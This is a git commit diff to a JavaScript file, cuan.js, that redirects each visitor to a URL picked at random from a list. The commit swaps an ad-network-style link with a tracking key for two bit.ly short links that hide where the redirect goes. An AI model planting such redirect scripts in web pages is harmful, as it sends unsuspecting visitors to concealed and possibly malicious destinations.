80e1b92b4cb1f7cafecb36407002f52ddd145c29
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2022-01-25 18:41:08 -0600

    Update cuan.js

--- cuan.js
+++ cuan.js
@@ -1,6 +1,6 @@
 var dataUrl = [
-'//anomalousporch.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67',
-'https://dev-fivestarmovie.pantheonsite.io/'
+'https://bit.ly/3o0VyTE',
+'https://bit.ly/3GipkKq/'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
